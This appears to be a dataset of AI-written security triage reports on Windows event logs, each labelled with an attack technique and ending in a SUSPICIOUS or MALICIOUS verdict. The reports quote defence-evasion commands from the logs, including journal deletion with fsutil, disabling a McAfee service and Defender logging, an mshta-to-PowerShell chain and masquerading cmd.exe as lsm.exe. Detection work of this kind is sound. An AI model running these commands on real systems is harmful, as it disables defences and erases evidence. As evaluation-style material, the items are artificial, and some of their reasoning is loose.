- Implement further monitoring of registry activity and potentially revert unauthorized changes.

### Resolution:

- **Resolution:** **SUSPICIOUS** - The entry of registry changes that modify encryption policies without a justified rationale needs further investigation to rule out malicious intent or internal policy breach."
Code Signing Policy Modification,"### Analysis

Upon examination of the provided logs, the following points are observed:

1. **System Services and Time Changes**:
   - There are several Kernel-General (EventID 1 and 24) and Security (EventID 4616) events indicating changes in system time initiated by `svchost.exe`. Such time changes may occur during legitimate system activities, for synchronization purposes, and are generally expected to use `time.windows.com` as noted here. There is no indication of manual time alteration that might suggest tampering.

2. **Command Execution**:
   - The execution of commands like `cmd.exe /c bcdedit /set testsigning on` could potentially indicate an attempt to modify boot parameters or enable test signing mode, which can be used for loading unsigned drivers. However, without further context or signs of malicious use, it cannot be definitively categorized as malicious. Such commands may sometimes be executed during debugging processes.

3. **User Activity**:
   - Repeated execution of `wevtutil.exe` and `conhost.exe` by `admin_test` as observed in the Sysmon logs could be typical of system or administrative tasks being performed interactively or through scripts. The presence of `hostname.exe` and `whoami.exe` suggests the enumeration of system information, a common administrative task.
   
4. **Microsoft Edge Update**:
   - There are several logs related to Microsoft Edge Update processes. The sequence and context suggest an automated update process is taking place. Regular update checks and installations done by legitimate applications like Microsoft Edge are normal behavior.

5. **Processes and Integrity Levels**:
   - All observed `Integrity Levels` are set to `High` or `System`, consistent with administrative-level or system tasks running. No unexpected low integrity-level processes are seen which could indicate attempts at privilege elevation.

### Assessment:

- **Time Generalization**: Given that the system's time alteration events are logged via the Windows Time Service pointing to an NTP server, this behavior aligns with expected system synchronization processes rather than manual tampering.
  
- **Windows Services and Processes Execution**: The execution logs corresponding to legitimate system utilities (`bcdedit.exe`, `hostname.exe`, `whoami.exe`, etc.) and Edge updates suggest systematic activities consistent with typical maintenance or update duties.

- **Command Execution**: The presence of commands modifying the boot configuration (`bcdedit /set testsigning on`) warrants further investigation to confirm if this is intended for legitimate configurations or debugging, as unsanctioned use could lead to security risks.

### Conclusion:

Based on the details above, the activities within the logs cannot be conclusively marked as malicious due to the nature of the events and the absence of explicit compromise indicators.

**Resolution: SUSPICIOUS**

### Recommendation:

- **Further Investigation**:
  - Confirm whether the administrator `admin_test` was conducting known, legitimate administrative tasks.
  - Verify if the boot configuration command (`bcdedit /set testsigning on`) was explicitly sanctioned and necessary for debugging by authorized personnel.
  
- **Monitoring**:
  - Maintain active monitoring for any unexpected changes or behaviors, particularly regarding potential unauthorized system configuration modifications.

- **Security Audit**:
  - Conduct a full audit of user accounts and permissions, focusing on administrative activity logs for assurance against misuse."
Indicator Removal using FSUtil,"Based on the provided logs, let's analyze each segment for suspicious activity:

### Application Log Analysis
1. **Event ID 3079**: The volume change journal on `C:\` is being deleted. This might be suspicious if not expected as it can obscure changes on the drive, but no direct evidence of malicious intent is noted here.
2. **Event IDs 16384, 16394**: These relate to regular operations of the Microsoft-Windows-Security-SPP, tied to updates and security software status, and Windows Defender is on (Event ID 15).

### Sysmon Log Analysis
1. Several Sysmon Event ID 5 (Process Terminate) and Event ID 1 (Process Creation) entries show common system processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `fsutil.exe`, `rundll32.exe`, and system services starting up. One notably suspicious entry is `cmd.exe` executing `fsutil usn deletejournal /D C:`. Using `fsutil usn deletejournal` can be used to delete the USN change journal, an operation which could be used to cover tracks after a file system alteration.
2. `fsutil` was executed by a high-integrity `cmd.exe` process tied to a user `admin_test`. This could be indicative of an attempt to cover up illicit activity.

### Security Log Analysis
1. **Event IDs 4624 and 4672**: Multiple logon events using SYSTEM, which is common for background processes.
2. **Event ID 4798**: Frequent querying of all SAM (Security Account Manager) accounts. Not inherently suspicious unless correlating with other malicious activities.

### Conclusion
The system has typical operational logs with several standard process executions and operations. However, the specific action of using `cmd.exe` with `fsutil usn deletejournal /D C:` is atypical for regular users and could signify potential malicious activity, especially in absence of legitimate operational justification. 

### Final Assessment: 
- **Resolution: SUSPICIOUS**

### Guidance
- Further investigation is needed to understand whether the `fsutil usn deletejournal` command was executed for maintenance by authorized personnel or if it was potentially used to cover malicious activity. 
- Verify with system administrators or users for legitimate use of the mentioned command.
- Consider conducting a thorough investigation of digital assets linked to the `admin_test` account.
- Implement strict monitoring and alerting for use of sensitive commands or modification of logging/journaling features on critical systems."
Disable Remote Desktop Security Settings Through Registry,"Given the provided logs from the Windows system, I analyzed the available entries that focus on security events, process creation, and system operations. Here are my findings:

### Key Findings:
1. **Time Change Events**:
    - In the security logs (EventID 4616) and system logs (EventID 1), there are multiple mentions of a time change involving the system process `svchost.exe`. The system time appears to be manipulated slightly backward and forward. Although this could be benign under certain conditions, frequent time changes, especially shortly before and during pertinent security events, could indicate attempts to obscure or synchronize malicious activities.

2. **Login Events**:
    - EventID 4624 (Security log) shows multiple login events for the user `admin_test`. It is important to note the logon type is 3 (network login), which is typical for remote connections. The user 'admin_test' is featured prominently in the logs and possesses significant privileges as indicated in EventID 4672.

3. **Privilege Escalation**:
    - The same user 'admin_test' has been granted extensive privileges (SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, etc.) in several entries (EventID 4672). Such privileged actions should be closely scrutinized, especially if the user is not supposed to possess these privileges under normal operational procedures.

4. **Suspicious Process Executions**:
    - The Sysmon logs show multiple instances of `cmd.exe` executing commands to modify registry settings (`DisableSecuritySettings` flag in Terminal Services registry key), executed by 'admin_test' with high-level integrity (EventID 1). This action can indicate an attempt to weaken the system’s security posture and should be thoroughly investigated as potentially malicious.

5. **General Process Executions**:
    - Other process executions such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `reg.exe` executed by 'admin_test' are logged. While these executables can be used for legitimate purposes, the context and frequency of these operations, especially when used to change configurations or during times of interest, can be suspicious.

### Assessment:
Considering the overall behavior reflected in the logs, including privileged access, potential time manipulation, and direct registry modifications, there are clear signs of suspicious activity. These signs suggest more investigation is necessary to determine whether these activities are indeed malicious or were conducted as part of legitimate system administration tasks.

### Resolution:
**SUSPICIOUS**

### Guidance on Proceeding:
1. **Investigate User 'admin_test'**: Validate whether 'admin_test' is known and expected to perform such tasks. Check for any anomalies in their login pattern.
2. **Correlate Network Activity**: Analyze network logs around the time of the flagged events to determine any suspicious external connections.
3. **Check Endpoint Security Software**: Ensure that endpoint monitoring tools are intact and haven't been tampered with, and look for additional context around the execution of the suspicious commands.
4. **Review System Policies**: Assess the necessity and legitimacy of registry changes made, and ensure these aren't potentially harmful or unnecessary.
5. **Conduct a Threat Hunt**: Perform a deeper analysis of the system and similar patterns across other hosts potentially to identify if this behavior is isolated or systemic.

These steps will help determine if the event logs reflect an authorized administrative action or a compromise scenario requiring mitigation actions."
WINWORD Remote Template Injection,"After analyzing the logs provided, here are the observations and assessment:

1. **Application Log:**
   - Contains routine information related to the Software Protection Platform Service. No suspicious activities are noted here as this service is related to Windows activation and licensing which are normal activities on a Windows server.

2. **Security Log:**
   - The security events captured mainly include EventID 4616, which generally pertains to system time changes. The events show that the system time was adjusted, likely due to time synchronization with a time source (e.g., time.windows.com). The subject user is 'LOCAL SERVICE' from 'NT AUTHORITY', which is typical and not immediately suspicious.

3. **Sysmon Log:**
   - A series of process creations involving `wevtutil.exe` and `conhost.exe` are noted, frequently executed by the user `SERVER002\admin_test`.
   - `whoami.exe` and `cmd.exe` executions are also visible, indicating exploration of system user details and command line usage. Execution of `whoami` by itself is not inherently malicious; it is common in administrative or script-related actions.
   - A notable entry is the invocation of `cmd.exe` with a command line suggesting the launching of a Word document (`Calculator.docx`) from a temporary location. This can be suspicious if it was not a known legitimate operation, as command line invocations of office documents from non-standard paths could be indicative of a macro or payload execution attempt.
   - `MicrosoftEdgeUpdate.exe` execution seen under SYSTEM user is also expected as it indicates auto-updating features which are generally benign.

4. **System Log:**
   - The logs indicate events related to time zone and time synchronization with no obvious signs of exploitation.

**Assessment:**
- The logs do not show definitive evidence of compromise from the known patterns of malware or security incidents. However, there are activities, particularly the cmd.exe invocation to open a Word document from a temporary file path, that could raise suspicion depnding on the context. Such activity might require additional scrutiny to ensure it aligns with expected administrative tasks or user actions.

**Resolution:**
- **SUSPICIOUS** - There is potentially suspicious activity tied to command line invocation of a document from a temporary path which might need more thorough investigation in actual context by comparing against known baselines, exploring for any associated network activity, or examining the source of the document. Additional correlation with user activities and cross-referencing with threat intelligence would be prudent."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"Upon reviewing the provided Windows event logs, I have identified several elements that warrant detailed analysis:

### Detailed Analysis:

1. **Security Log**:
    - The log contains multiple 4624 events, which indicate successful logons. Event ID 4624 with Logon Type 5 is typically a service or scheduled task logon, which is generally routine and non-malicious.
    - The presence of multiple event ID 5379 entries suggests credential validation attempts. The return code `3221226021` signifies a failed validation, possibly due to incorrect credentials. These frequent credential evaluation failures could indicate brute force login attempts or misconfigured services, which may warrant further inspection.
    - Event ID 4672 indicates special privileges being assigned to accounts, which could include sensitive operations. Notably, `SeDebugPrivilege` among others are included, often indicating highly privileged action.
    - A number of Event ID 4798 occur, suggesting queries for a user account group membership, which might be a precursor or reconnaissance phase for privilege escalation attempts.

2. **Sysmon Log**:
    - Process creation events such as the execution of `cmd.exe` with the command line ending in `""Start-Process calc""` suggest execution of a command to start a calculator, which might be used as a payload for testing purposes in malicious activities.
    - Execution of potentially administrative command-line utilities like `wevtutil.exe`, whoami.exe` can be either routine for administrative tasks or misuse in reconnaissance or further exploitation by an actor. Their execution by `SERVER002\\admin_test` user with `High` integrity level suggests a privileged context.
    - Several instances of EdgeUpdate activity with service start and stop actions are noted, as well as updates which, while potentially benign, should be verified against known schedules and versions to rule out unauthorized software changes.

3. **Application Log**:
    - The logging of Windows Defender in the `SECURITY_PRODUCT_STATE_ON` state shows the Defender was operational.
    - Entries for `edgeupdate` indicating service stops correspond to Sysmon logs where EdgeUpdate processes were involved. These could reasonably align with routine update operations, though should be confirmed.

4. **System Log**:
    - Contains entries related to security intelligence updates for Microsoft Defender Antivirus, indicating a normal update process.

### Assessment:

- **Potential Indicators of Malicious Activity**:
  - The frequent credential validation failure (Evt. ID 5379) requires investigation to understand if they are expected failed login attempts or malicious activity.
  - Execution of a potentially suspicious command (`""Start-Process calc""`), indicating potential use of command execution for testing or unauthorized activities.
  - A cluster of high-privilege activities noted around the same time may hint toward an orchestrated set of operations influenced by a potential threat actor.

### Guidance:

- **Immediate Action**:
  - Investigate the cause of repeated failed credential validation, ensuring they are authorized and expected.
  - Review `cmd.exe` and related log entries for unauthorized command execution.
  - Verify the legitimacy of the Edge update processes to ensure they were not hijacked by a threat actor.
  
- **Resolution**: **SUSPICIOUS**

While not explicitly confirmed as malicious, the log events contain multiple suspicious attributes that may warrant further investigation to rule out any attempts at or successful breaches. Proactive measures should include escalated monitoring and possibly applying stricter access controls or conducting a full user and process audit on the machine in question."
Disable Windows Notification Center,"### Analysis of Windows Event Logs

After analyzing the provided event logs, several observations can be made for the purpose of determining any suspicious or malicious activity:

1. **Frequent Execution of Standard Utilities:**
   - **wevtutil.exe** and **conhost.exe**:
     - These binaries are legitimate Windows system utilities.
     - **wevtutil.exe** is frequently invoked, which can be used for querying or clearing event logs. Repeated invocation by the user ""SERVER002\admin_test"" suggests routine log management tasks. 
     - **conhost.exe** is a console window host, often used by command-line applications to interface with the console.

2. **Execution of Diagnostic Utilities:**
   - **whoami.exe** and **HOSTNAME.EXE** executed by ""SERVER002\admin_test""  are diagnostic or informational tools that provide system and user information. The executions seem benign, likely part of routine system administration activity.

3. **Registry Modification:**
   - Command executed: `cmd.exe /c reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f`.
   - This command disables the Windows Notification Center for the current user. It is not inherently malicious but could indicate an attempt to suppress user notifications, which might be something to watch depending on user behavior norms.

4. **Time Changes:**
   - There is an event indicating the system time was altered: ""NewTime"":""2024-10-24 14:56:29.1505320"" from ""OldTime"":""2024-10-24 14:56:33.5481178"".
   - Time adjustments can sometimes indicate suspicious behavior if misused, such as altering logs, although in this instance, it could be a part of normal synchronization actions.

5. **Edge Update Executions:**
   - Multiple Microsoft Edge Update processes, such as MicrosoftEdgeUpdate.exe, indicate regular software maintenance processes; these involve system-level tasks run by `NT AUTHORITY\SYSTEM`, extracted from secure update mechanisms.

### Assessment:

- **Registry Changes**: The registry change to disable the Notification Center, while not inherently malicious, could imply an attempt to reduce user awareness of activities on the system. This, combined with time change events, might be considered suspicious if out of ordinary user behavior.
- **Time Modification**: Could potentially indicate log tampering efforts though no immediate malicious context is apparent such as privileges mismatched or unknown users.
  
### Resolution Assessment:

Given these insights and the lack of any concrete evidence of a breach or definitive malicious intent:

- **Resolution**: **SUSPICIOUS**

This classification is appropriate as the activities observed (such as disabling notifications and time alterations) might require further investigations, especially if they diverge from known user behavior patterns. It is recommended to audit this account activities and verify the intent and context around these changes with the account owner.

### Guidance on Proceeding:

1. **User Review**: Interview the user 'admin_test' to confirm the purpose of these execution and registry modifications.
2. **Policy Audit**: Verify system policies regarding who can execute registry changes to sensitive user interface settings.
3. **Time Source Verification**: Check time source configurations and policies to ensure time changes align with network time protocols.

Further monitoring and reviewing of logs in the coming days are recommended to ensure no emerging patterns of concern develop."
UACME Bypass Method 59,"Upon analyzing the provided Windows event logs, I identified several indicators of suspicious behavior that could signify potential malicious activity:

### Key Observations:

1. **Command Execution Concerns:**
   - The execution of `cmd.exe` with the command `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\59 Akagi64.exe` is suspicious. This potentially indicates the use of a tool like UACMe, which is known to exploit User Account Control (UAC) for privilege escalation in Windows environments.
   - There is a repeated pattern of `cmd.exe` and `powershell.exe` usage which are common vectors for malicious activities, especially when tied with high-level integrity.

2. **Process Launch with High Integrity Level:**
   - The processes executed by `SERVER002\admin_test`, such as `cmd.exe`, `wevtutil.exe`, and `hostname.exe`, appear to be run with high integrity levels which could indicate an attempt at privilege escalation.

3. **Processes Related to Microsoft Edge Update:**
   - There are multiple processes associated with Microsoft Edge Update, seemingly legitimate actions at first glance. However, due to the density and grouping within short time intervals, these could be masking potentially illegitimate usage or serving as a persistence method.

4. **Suspicious Executable Path:**
   - The path involving `..\Externalfiles\uacme\59 Akagi64.exe` seems designed to bypass direct path execution checks, a common tactic in exploits or running unauthorized scripts.

5. **Frequent Use of `wevtutil.exe`:**
   - `wevtutil.exe` is frequently used to manipulate Windows event logs, which can be indicative of a malicious actor attempting to clear logs or manipulate them to hide traces of unauthorized activities.

### Assessment:

- **Risk Identified:**
  The presence of UACMe tool indicators, coupled with high integrity level processes, suggests an attempt at privilege escalation. The use of standard tools like `cmd.exe` and `powershell.exe` with potentially obfuscated scripts or exploits also adds to the possibility of malicious activity.

### Suggested Actions:

- **Deactivate Potentially Compromised Accounts:**
  Isolate and review the `admin_test` account activities on `Server002` to mitigate any ongoing threats.
- **Conduct a Forensic Analysis:**
  Investigate the presence and potential execution of `uacme` and other suspicious executables.
- **Inspect Event Log Modifications:**
  Review logs for any unauthorized clearing or tampering, potentially using `wevtutil.exe`.
- **Network Monitoring:**
  Increase vigilance on the network traffic from this host to detect potential data exfiltration or lateral movement.

### Final Resolution:

- **Resolution: MALICIOUS**
  The logs exhibit signatures of a potential malicious pattern involving privilege escalation and possibly unauthorized system access. Immediate action and further in-depth investigation are required."
"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","Upon reviewing the provided logs, several observations can be made:

1. **PowerShell Activity:**
   - There is extensive PowerShell activity logging, indicating that scripts are being run that pertain to the installation and execution of KeyScrambler software. Key elements of the operation include: downloading KeyScrambler, installation using silent arguments, and copying binary files to the temporary directory.
   - Notably, the scripting mentions that a modified KeyScramblerIE.dll could be misused by attackers, which is a red flag from a security perspective.

2. **Process Creation and Execution:**
   - Several processes have been executed, primarily related to KeyScrambler configuration and execution. What stands out is the use of `regsvr32.exe`, which is known to be leveraged in various attack vectors.
   - System-level processes like `svchost.exe` and `conhost.exe` are being used, which might be normal but should be carefully reviewed in context with PowerShell scripting that suggests DLL modification potential.

3. **Service Installations:**
   - The system log indicates the installation of a kernel mode driver related to KeyScrambler (`keyscrambler.sys`), and a user mode service called `QFX Software Update Service`. 
   - These installations require admin privileges and are generally benign if conducted legitimately. However, given the context of the PowerShell script and potential DLL issues, it's prudent for this to be investigated further.

4. **Sysmon Events:**
   - Sysmon logs indicate high integrity-level operations running under `SERVER002\admin_test`, confirming administrative execution context. However, the logs don't show any unauthorized or suspicious processes outside the scope of KeyScrambler and some system updates.

5. **Application & System Logs:**
   - The logs show expected behavior for Windows Defender updates and Edge updates. Other than the KeyScrambler installation, there's no mention of other application runtime anomalies.

6. **Security Implications:**
   - The narrative and description within the script indicate a potential security issue with modified DLLs. This could be flagged as potentially malicious behavior if alteration without user authorization occurs.

### Conclusion:
Given the context of provided logs, this activity falls under SUSPICIOUS.

### Resolution:
The activity is marked as SUSPICIOUS, as there are potential security risks involving DLL usage as indicated by the PowerShell script, and such scripts could be used maliciously when left unchecked. Further investigation is necessary to determine the intent and safety of these operations.

Mshta executes VBScript to execute malicious command,"After analyzing the provided Windows event logs, the following observations and assessments can be made:

1. **Suspicious Process Execution**:
   - There are multiple occurrences of `cmd.exe` executing a potentially obfuscated command that involves `mshta.exe` creating a PowerShell process. This is frequently associated with malicious activities such as script-based attacks or lateral movement. Specifically, the command: `cmd.exe /c mshta vbscript:Execute(""CreateObject(\""Wscript.Shell\"").Run \""powershell -noexit -file C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.005\src\powershell.ps1\"":close"")` is suspicious.
   - The chaining of processes using `cmd.exe`, `mshta.exe`, and `powershell.exe` indicates potential script-based execution that could be used to execute malicious payloads or scripts.

2. **Use of `wevtutil.exe`**:
   - The frequent execution of `wevtutil.exe`, a command line tool to manage event logs, is not typical for regular administrative tasks and could suggest attempts to evade detection by clearing logs or querying logs for specific data.

3. **Privileged Account Activity**:
   - The user `SERVER002\admin_test` is seen executing all the suspicious commands, and this account has considerable privileges as indicated by the presence of `SeDebugPrivilege`, among others. Such privileges could allow for activities that evade the standard security mechanisms.

4. **Indicators of Process Injection or Evasion Techniques**:
   - The use of `mshta.exe` with obfuscated VBScript is a known technique used by attackers to bypass security defenses and execute arbitrary code. It's uncommon for legitimate operations to require such methods.

5. **Network Connections and Logon Events**:
   - The logon event indicates that the `admin_test` account used NTLM authentication, which was initiated from a workstation named `DESKTOP-3HL5B2P`, with an IP address of `192.168.0.102`. This may point to lateral movement or unauthorized remote access.

6. **Microsoft Edge Update**:
   - There are entries related to Microsoft Edge Update, which appear to be regular update activities. However, given the context of other suspicious activities, it is important to ensure that these update processes have not been manipulated or used as a vector for malicious payloads.

**Assessment**:
Based on the event analysis, particularly the execution chain involving `cmd.exe`, `mshta.exe`, and `powershell.exe` with potentially obfuscated and malicious command execution, there are clear indicators of compromise and potentially malicious activity.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately isolate the affected system (Server002) to prevent any further malicious activities.
- Perform a detailed forensic investigation on the actions of the `admin_test` account.
- Review and limit the privileges of administrative accounts to minimize unauthorized use.

- Confirm the integrity of Microsoft Edge updates and other software to ensure they haven't been tampered with."
Disable Arbitrary Security Windows Service,"After analyzing the provided Windows event logs, here's a detailed breakdown:

### Suspicious or Anomalous Behavior:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - The `wevtutil.exe` process is seen executing multiple times by the user `SERVER002\\admin_test`. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, frequent execution in a short span might indicate an attempt to tamper with event logs, potentially to cover tracks after an incident.
   - The `conhost.exe` instances are likely tied to command-line operations, as seen with the multiple instances linking back to processes like `wevtutil.exe` and others.

2. **Usage of `hostname.exe` and `whoami.exe`**:
   - Both `hostname.exe` and `whoami.exe` are observed executing. These commands are typically benign on their own but can be used during scripts or by an attacker to gather system and user information.

3. **Suspicious Command with `cmd.exe`:**
   - Execution of `cmd.exe` with a command line argument to stop `McAfeeDLPAgentService` and disable it (`sc.exe config McAfeeDLPAgentService start= disabled`). This behavior is highly suspicious and indicative of disabling security tools, often a hallmark of malicious activity attempting to evade detection.

4. **System Processes Execution:**
   - Instances of `svchost.exe` and other system processes executing under `NT AUTHORITY\\NETWORK SERVICE` or `NT AUTHORITY\\SYSTEM` appear normal as they often represent legitimate service processes.

5. **Frequent `Microsoft Edge Update` Executions:**
   - Numerous logs show Microsoft Edge Update processes. This is typical of a system performing updates or the browser itself updating but should be verified for legitimacy.

### Indicator of Malicious Activity:

The critical indicator of malicious activity is the command line execution via `cmd.exe` to stop and disable the McAfee DLP Agent Service. This behavior is typically associated with attempts to compromise or disable security defenses, a clear red flag for malicious intent.

### Assessment:

Based on the analysis of the Windows event logs:

- **Resolution: MALICIOUS**

The logs contain activity that is indicative of malicious behavior, primarily due to the attempt to stop and disable a security service (McAfeeDLPAgentService).

### Guidance on How to Proceed:

1. **Immediate Threat Detection and Response:**
   - Isolate the affected machine from the network to prevent any further lateral movement or data exfiltration.
   - Conduct a thorough forensic investigation with a focus on the timeframes seen in the logs.

2. **Review and Reinforcement of Security Measures:**
   - Evaluate the system's patch level and security tools configuration.
   - Consider the implementation of additional security monitoring tailored to detect such unusual activities.

3. **User and Privilege Review:**
   - Review the usage and permissions of the `admin_test` account and others involved in the suspicious activities.
   - Ensure principle of least privilege and validate all admin accounts for legitimacy.

4. **Awareness and Training:**
   - Conduct training sessions for users about recognizing phishing attempts or social engineering tactics that might lead toward credential compromise or system misuse.

By following these steps, the organization can mitigate the risk posed by the observed activities and strengthen its defensive posture."
LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"**Analysis of Logs**

**1. System Log:**
- The log entries primarily capture time change events involving the svchost.exe process, which is a typical behavior for the Windows Time Service. These entries show adjustments to system time sourced from time.windows.com as part of normal time synchronization activities.

**2. Application Log:**
- The logs show the ""edgeupdate"" service stopping a couple of times and Microsoft-Windows-Security-SPP, indicating routine software updates and protection platform activities. These log entries alone do not indicate malicious behavior.

**3. Windows PowerShell Log:**
- The PowerShell logs reveal a command executed to disable a Windows Defender logging channel by setting its registry key value to 0 (`New-ItemProperty` on `HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational`).
  
  This action is suspicious because:
  - Disabling security logging can indicate an attempt to avoid detection, commonly associated with malicious activity.
  - The command looks like an intentional change to system security configurations, which should be monitored closely.

**4. Sysmon Log:**
- Multiple instances of benign processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and Edge Update processes are recorded. These are typical system processes and do not inherently indicate malicious activities.
- The Sysmon log shows the execution of legitimate system administration utilities, which doesn't on its own indicate any unauthorized activity.
  
**5. Security Log:**
- Similar to the System log, these entries corroborate the changes in system time. These specific activities regarding time changes performed by svchost.exe under the NT AUTHORITY\LOCAL SERVICE context do not trigger security concerns under normal circumstances.

**Assessment:**
- The PowerShell activity of disabling Defender's logging channel is the most notable anomaly indicating possible malicious intent. Although it doesn’t confirm malicious activity on its own, it does warrant further investigation into why this change was made, who executed it, and whether there was any follow-up activity to exploit the absence of logging.

**Resolution:**
**SUSPICIOUS - The logs contain activity that doesn't seem right and needs more investigation.**

**Guidance and Next Steps:**
- Investigate the account context (`admin_test`) that executed the suspicious PowerShell command to determine if it had authorized reasons for such actions.
- Review recent modifications or installations and correlate with time logs to identify any unauthorized activities.
- Conduct a system integrity check and run a comprehensive malware scan.
- Enhance monitoring around critical configurations and audit PowerShell script execution more rigorously to ensure transparency in system changes."
DLL Side-Loading using the dotnet startup hook environment variable,"Upon reviewing the provided Windows event logs, here are the key observations and analysis:

1. **Microsoft Edge Update Activity**: 
   - Numerous instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` being run under the `NT AUTHORITY\SYSTEM` user are logged. This suggests a legitimate update process for Microsoft Edge, as both executables are part of the standard update mechanism for the Edge browser.
   - These processes are executed with expected command lines and don't show anomalies typically associated with compromised executables.

2. **PowerShell Executions**:
   - The `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` process is executed by the user `SERVER002\admin_test`. However, the logs do not provide details about the command line arguments or scripts that were executed. Without additional context or unusual command line arguments, this execution appears benign yet warrants attention for unusual script activity in other logs.

3. **Process Executions by `admin_test`**:
   - Processes such as `whoami.exe`, `cmd.exe`, and `hostname.exe` are executed by the user `SERVER002\admin_test`. The usage of `whoami.exe` is a common command for checking user contexts, often used in post-exploitation scenarios to understand user privileges.
   - There is a command using `cmd.exe` that includes setting `DOTNET_STARTUP_HOOKS` to a preloader DLL in a temporary path, which stands out as highly suspicious. The use of a preloader DLL within a temp directory and involving .NET potentially indicates attempts to sideload or execute unauthorized code in a manner consistent with post-exploitation frameworks or malware.

4. **Use of Command Line Tools**:
   - Multiple uses of command line tools such as `wevtutil.exe` and `conhost.exe` are observed. While these can be normal for system administration, in the context of suspicious cmd executions and the user context being `admin_test`, it's worth considering further investigation into activities surrounding these events.

5. **Sysmon Activity**:
   - The logs from Sysmon show that the integrity level of most processes run is either high or system, which is normal but emphasizes the need to examine whether elevated processes were legitimately initiated.

---

**Assessment**: Based on the analysis, the activity involving the explicit setting of `DOTNET_STARTUP_HOOKS` with references to `preloader.dll` is highly suspicious and potentially indicative of malicious activity or unauthorized code execution. The events concerning `EdgeUpdate` seem routine and legitimate.

**Resolution**: **SUSPICIOUS**

**Recommended Action**:
- Conduct a deeper investigation into the execution of `cmd.exe` with unusual `DOTNET_STARTUP_HOOKS`. Determine if `preloader.dll` was present on the system and its origin.
- Review any associated network traffic or communications and cross-examine with other endpoint detection and response systems to identify any indicators of compromise related to the observed suspicious activities.
- Enhance monitoring for any unauthorized use of PowerShell, cmd, and other potentially dual-use utilities in the network."
Malicious process Masquerading as LSM.exe,"Upon reviewing the provided log entries, several patterns of behavior emerge that raise flags for potential malicious activity.

**1. Security Log Analysis:**
- We observe multiple EventID 5379 entries with ReturnCode 3221226021, indicating failure in accessing credentials for targets like MicrosoftAccount and WindowsLive tokens. Repeated failures in credential access, especially to MicrosoftAccount and WindowsLive, might signify an attempt to access user or system credentials improperly.

**2. Sysmon Log Analysis:**
- There is a suspicious use of cmd.exe to copy itself to lsm.exe and then execution of this renamed executable to create a file. The command line `""cmd.exe /c copy C:\Windows\System32\cmd.exe C:\lsm.exe & C:\lsm.exe /c echo data.003 > C:\data.003.txt""` suggests obfuscation: copying `cmd.exe` to `lsm.exe` (a commonly used Windows service name) to potentially masquerade as a legitimate process. This is a strong indicator of malicious activity.
- The use of tools like `whoami.exe` and `hostname.exe` in rapid succession could suggest enumeration attempts typical of reconnaissance or privilege validation steps taken by malicious actors.
- Multiple instances of wevtutil.exe and conhost.exe processes being spawned by the same user (SERVER002\admin_test) can be a normal activity, but given the context, should be examined further to rule out if event logs are being tampered.

**3. System Log Analysis:**
- There are typical Windows Update events logged (EventID 44 and 43) indicating updates to Microsoft Defender Antivirus, which appear benign.

**4. No Data in PowerShell and Application Logs:**
- Absence of PowerShell logs is an area of concern if PowerShell-based activities are expected in this environment. Manual or automated tampering could be a factor.

### Assessment:
Given the observed log patterns and behaviors, especially the file renaming and execution pattern and repeated credential access failures, the activity as a whole is indicative of potentially malicious behavior.

### Resolution:
- **MALICIOUS**: The activity of copying `cmd.exe` to `lsm.exe` and executing it is directly indicative of malicious behavior. 

### Guidance on How to Proceed:
- Isolate the machine to prevent further potential compromise and to preserve forensic evidence.
- Conduct a detailed forensic investigation to understand the scope and intent of the malicious actions.
- Review other machines and logs in the network for similar patterns to identify if this is part of a larger attack.
- Strengthen monitoring and alerting on similar command line activities and failed access logs in the future.
- Update security policies and ensure all machines are fully patched and secured against known vulnerabilities."
Flush Shimcache,"Based on the provided event logs from a Windows machine, here is a detailed analysis:

### Security and System Logs:
1. **Event ID 4616 (Time Change)**: These events record system time changes. They note changes made by the `svchost.exe` process under the `LOCAL SERVICE` account. Though time changes may indicate malicious activity (e.g., timestamp manipulation for logs), in this context, the rapid back-and-forth changes suggest possible synchronization or misconfiguration issues rather than deliberate malicious activity.

### Sysmon Logs:
1. **Process Execution Events**:
   - Numerous instances of `wevtutil.exe` and `conhost.exe` initiated by the user `SERVER002\admin_test`. This activity is typical when interacting with the Event Viewer but seems repetitive and could indicate automated script activity or a user extensively manipulating event logs.
   - Execution of `whoami.exe`, `cmd.exe`, and `Rundll32.exe` processes, especially with the `ShimFlushCache` command in `cmd.exe`, could suggest a technique for evasion or an attempt to manipulate system settings or applications.

2. **Microsoft Edge Update Activity**:
   - Multiple events show `MicrosoftEdgeUpdate.exe` processes running as `NT AUTHORITY\SYSTEM`, conducting typical update tasks. This includes the execution of the update service and associated registration tasks under both `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`.
   - These entries appear consistent with normal system updates and do not directly indicate malicious behavior. However, frequent update-related tasks could warrant a check to ensure no abuse of update mechanisms.

3. **Process and User Insights**:
   - Execution integrity levels marked as ""High"" indicate privileged operations, especially those conducted by `SERVER002\admin_test`. Such activity is standard for administrative tasks but should be monitored for potential abuse.

4. **Unusual Commands**:
   - Commands like `Rundll32.exe apphelp.dll,ShimFlushCache` may be leveraged in non-malicious scenarios (e.g., application caching management) but should be investigated for potential misuse or unintentional execution.

### Application Log:
1. **Edge Update Service Stop Messages**:
   - The ""Service stopped"" messages appear for the edge update, aligning with typical update activities where services are stopped post-update or during reconfiguration.

### Assessment:
The logs present a blend of routine administrative activity, system/service updates, and potentially scripted operations. While there are some unusual patterns (frequent event log tool use and specific command executions), these do not immediately suggest malicious behavior. However, some items must be considered suspicious due to administrative account use and particular commands consistently appearing within the timeframe.

### Resolution: **SUSPICIOUS**
